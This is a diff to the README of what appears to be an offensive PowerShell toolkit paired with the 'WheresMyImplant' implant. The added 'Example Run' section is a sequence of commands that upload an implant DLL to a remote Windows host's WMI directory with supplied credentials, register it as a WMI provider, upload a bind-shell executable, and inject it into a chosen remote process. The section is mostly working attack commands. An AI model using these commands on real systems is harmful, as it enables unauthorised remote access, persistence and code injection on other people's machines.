@@ -47,6 +47,19 @@ Primarily used in conjunction with WheresMyImplant - https://github.com/0xbadjuj
   * **Uninstall-WMIProviderExtention**
     * Uninstall-WMIProvider -ProviderName WheresMyImplant -ClassName Win32_Implant C:\WheresMy -ComputerName $ComputerName -Credential $Credential
 
+#### Example Run
+
+Invoke-WMIUpload -PayloadPath C:\WheresMyImplant.dll -PayloadName WheresMyImplant.dll -Destination C:\Windows\System32\wbem -ComputerName $ComputerName -Credential $Credential -Verbose
+
+Install-WMIProviderExtention -LocalLibraryLocation C:\WheresMyImplant.dll -ComputerName $ComputerName -Credential $Credential -Verbose
+
+Invoke-WMIUpload -PayloadPath C:\bind64.exe -PayloadName bind64.exe -ComputerName $ComputerName -Credential $Credential -Inject -Verbose
+
+(Get-WmiObject -List -Class Win32_Implant -ComputerName $ComputerName -Credential $Credential).Methods["InjectPeWMIFS"].InParameters
+
+Get-WmiObject Win32_Process | Select Name, ProcessId
+
+Invoke-WmiMethod -Class Win32_Implant -Name InjectPeWMIFS -ArgumentList "bind64.exe", "", 4596, "WMIFS" -ComputerName $ComputerName -Credential $Credential
 
 ### Author, Contributors, and License
 
